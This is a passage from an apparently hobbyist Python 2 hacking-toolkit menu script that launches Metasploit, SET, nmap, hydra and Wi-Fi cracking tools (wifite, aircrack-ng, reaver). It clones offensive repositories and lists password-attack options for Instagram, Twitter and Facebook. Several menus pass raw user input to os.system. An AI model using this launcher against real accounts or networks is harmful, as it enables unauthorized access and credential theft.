\033[35m███████\033[0m╗\033[35m██\033[0m╔╝ \033[35m██\033[0m╗\033[35m██\033[0m║     \033[35m███████\033[0m╗╚\033[35m██████\033[0m╔╝\033[35m██\033[0m║   \033[35m██\033[0m║   
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
  '''.decode('utf-8')
  print "\n"
def exploits():
  exploitbanner()
  print G+"-" * 100
  print r+"[1]  start metasploit"
  print "[2]  start setoolkit"
  print G+"-" * 100
  exploit = raw_input(P+"[EXPL0IT] \033[0m->: \033[0m")
  if exploit == "1" :
    os.system("service postgresql start")
    os.system("msfconsole")
  if exploit == "2" :
    os.system("service postgresql start")
    os.system("setoolkit")
  if exploit == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+exploit
    os.system("sleep 2")
    os.system("clear")
    mainbanner()

def infobanner():
  print B+'''
           ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄                 
          ▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌                
           ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌                
               ▐░▌     ▐░▌▐░▌    ▐░▌▐░▌          ▐░▌       ▐░▌                
               ▐░▌     ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌                
               ▐░▌     ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌                
               ▐░▌     ▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌                
               ▐░▌     ▐░▌    ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌                
           ▄▄▄▄█░█▄▄▄▄ ▐░▌     ▐░▐░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌                
          ▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░▌          ▐░░░░░░░░░░░▌                
           ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀ \033[92m                
                                                                              
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌ ▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ 
▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀       ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀
 '''.decode('utf-8')
  print "\n"
def info():
  infobanner()
  print G+"-" * 100
  print r+"[1]  Striker"
  print "[2]  Webkiller"
  print "[3]  RED_HAWK"
  print "[4]  quick ip grab"
  print "[5]  portscan only"
  print "[6]  nmap"
  print G+"-" * 100
  info = raw_input(B+"[INFO] \033[92m->: \033[0m")
  if info == "1" :
    striker()
  if info == "2" :
    webkiller()
  if info == "3" :
    redhawk()
  if info == "4" :
    ipgrab = raw_input("Enter Website: ")
    ip = socket.gethostbyname(ipgrab)
    print R+"---------------------------------"
    print Y+"Website: ", G+ipgrab
    print Y+"IP: ", G+ip
    print R+"---------------------------------"
  if info == "5" :
    portscan()
  if info == "6" :
    print "Type nmap commands   Example: --> nmap www.pornhub.com -b -F"
    nmap = raw_input(R+"--> \033[0m")
    os.system(nmap)
  if info == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+info
    os.system("sleep 2")
    os.system("clear")
    mainbanner() 

def toolsbanner():
  print LB+"""
  88888888888 .d8888b.   .d8888b.  888          
      888    d88P  Y88b d88P  Y88b 888          
      888    888    888 888    888 888          
      888    888    888 888    888 888 \033[91m88888888\033[1;36m 
      888    888    888 888    888 888    \033[91md88P\033[1;36m  
      888    888    888 888    888 888   \033[91md88P\033[1;36m   
      888    Y88b  d88P Y88b  d88P 888  \033[91md88P\033[1;36m    
      888     "Y8888P"   "Y8888P"  888 \033[91m88888888\033[0m 
      \n
      """
def tools():
  toolsbanner()
  print G+"-" * 100
  print r+"[1]  SiteBroker  :   \033[0m[\033[93minfo\033[0m]"
  print r+"[2]  SocialBox   :   \033[0m[\033[93mpassword\033[0m]"
  print r+"[3]  4nonimizer  :   \033[0m[\033[93mVPN\033[0m]"
  print r+"[4]  SniffAir    :   \033[0m[\033[93mexploit\033[0m]"
  print r+"[5]  Metasploit  :   \033[0m[\033[93mexploit\033[0m]"
  print G+"-" * 100
  tools = raw_input("[T00Lz] \033[94m->: \033[0m")
  if tools == "1" :
    print R+"[!] press ctrl C to stop the script / download\033[0m"
    os.system("sleep 1")
    os.system("cd && git clone https://github.com/Anon-Exploiter/SiteBroker")
  if tools == "2" :
    print R+"[!] press ctrl C to stop the script / download\033[0m"
    os.system("sleep 1")
    os.system("cd && git clone https://github.com/TunisianEagles/SocialBox")
  if tools == "3" :
    print R+"[!] press ctrl C to stop the script / download\033[0m"
    os.system("sleep 1")
    os.system("cd && git clone https://github.com/Hackplayers/4nonimizer")
  if tools == "4" :
    print R+"[!] press ctrl C to stop the script / download\033[0m"
    os.system("sleep 1")
    os.system("cd && git clone https://github.com/Tylous/SniffAir")
  if tools == "5" :
    print "would you like to download metasploit via github or apt install? [git/apt]"
    install = raw_input(R+"[INSTALL]> \033[0m")
    if install == "git" :
      print R+"[!] press ctrl C to stop the script / download\033[0m"
      os.system("sleep 1")
      os.system("cd && git clone https://github.com/rapid7/metasploit-framework")
    if install == "apt" :
      print R+"[!] press ctrl C to stop the script / download\033[0m"
      os.system("sleep 1")
      os.system("apt install metasploit-framework")   
  if tools == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+tools
    os.system("sleep 2")
    os.system("clear")
    mainbanner()

def passwordbanner():
  print N+"""
   @@@@@@@  @@@@@@@    @@@@@@    @@@@@@@  @@@  @@@  @@@  @@@  @@@   @@@@@@@@  
  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@@ @@@  @@@@@@@@@  
  !@@       @@!  @@@  @@!  @@@  !@@       @@!  !@@  @@!  @@!@!@@@  !@@        
  !@!       !@!  @!@  !@!  @!@  !@!       !@!  @!!  !@!  !@!!@!@!  !@!        
  !@!       @!@!!@!   @!@!@!@!  !@!       @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
  !!!       !!@!@!    !!!@!!!!  !!!       !!@!!!    !!!  !@!  !!!  !!! !!@!!  
  :!!       !!: :!!   !!:  !!!  :!!       !!: :!!   !!:  !!:  !!!  :!!   !!:  
  :!:       :!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  :!:  !:!  :!:   !::  
   ::: :::  ::   :::  ::   :::   ::: :::   ::  :::   ::   ::   ::   ::: ::::  
   :: :: :   :   : :   :   : :   :: :: :   :   :::  :    ::    :    :: :: : 
   \n
   """
def password():
  passwordbanner()
  print G+"-" * 100
  print r+"[1]  hydra"
  print "[2]  instagram"
  print "[3]  twitter"
  print "[4]  facebook"
  print G+"-" * 100
  password = raw_input("[PASSWD] \033[94m->: \033[0m")
  if password == "1" :
    hydra()
  if password == "2" :
    instagram()
  if password == "3" :
    twitter()
  if password == "4" :
    facebook()
  if password == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+password
    os.system("sleep 2")
    os.system("clear")
    mainbanner()  

def reaver():
  print "Example: reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv   reaver -h for help"
  reaver = raw_input("[REAVER]: ")
  os.system(reaver)
def wifite():
  print "Example: wifite --wps --crack    wifite -h for help"
  wifite = raw_input("[WIFITE]# ")
  os.system(wifite)
def aircrack():
  print " aircrack-ng --help   for help for airmon   airmon-ng -h for help"
  aircrack = raw_input("[AIRCRACK]> ")
  os.system(aircrack)


def wirelessbanner():
  print '''
 __       __  __                      __                              
/  |  _  /  |/  |                    /  |                             
$$ | / \ $$ |$$/   ______    ______  $$ |  ______    _______  _______ 
$$ |/$  \$$ |/  | /      \  /      \ $$ | /      \  /       |/       |
$$ /$$$  $$ |$$ |/$$$$$$  |/$$$$$$  |$$ |/$$$$$$  |/$$$$$$$//$$$$$$$/ 
$$ $$/$$ $$ |$$ |$$ |  $$/ $$    $$ |$$\033[94m |$$    $$ |$$      \$$      \ 
$$$$/  $$$$ |$$ |$$ |      $$$$$$$$/ $$ |$$$$$$$$/  $$$$$$  |$$$$$$  |
$$$/    $$$ |$$ |$$ |      $$       |$$ |$$       |/     $$//     $$/ 
$$/      $$/ $$/ $$/        $$$$$$$/ $$/  $$$$$$$/ $$$$$$$/ $$$$$$$/  
  \n
  '''
def wireless():
  wirelessbanner()
  print G+"-" * 100
  print r+"[1]  wifite"
  print "[2]  aircrack-ng / airmon-ng"
  print "[3]  reaver"
  print G+"-" * 100
  wireless = raw_input("[WIRELESS] \033[94m->: \033[0m")
  if wireless == "1" :
    wifite()
  if wireless == "2" :
    aircrack()
  if wireless == "3" :
    reaver()
  if wireless == "menu" :
    os.system("clear")
    mainbanner()
  else:
    print r+"no option called ", R+wireless
    os.system("sleep 2")
    os.system("clear")
    mainbanner()  

def menu():
  found = False
  while not found:
    menu = raw_input(P+"[TuF] \033[93m->: \033[0m")

    if menu == "?" :
      help()
    if menu == "1" :
      stress()
    if menu == "clear" :
      os.system("clear")
      mainbanner()
    if menu == "2" :
      exploits()
    if menu == "exit" :
      print Y+"Exiting..."
      os.system("sleep 2")
      print G+"Follow \033[0m@unkn0wn_bali \033[92mOn Instagram\033[0m"
      os.system("sleep 1")
      sys.exit()
    if menu == "3" :
      info()
    if menu == "4" :
      tools()
    if menu == "5" :
      password()
    if menu == "6" :
      wireless()
menu()
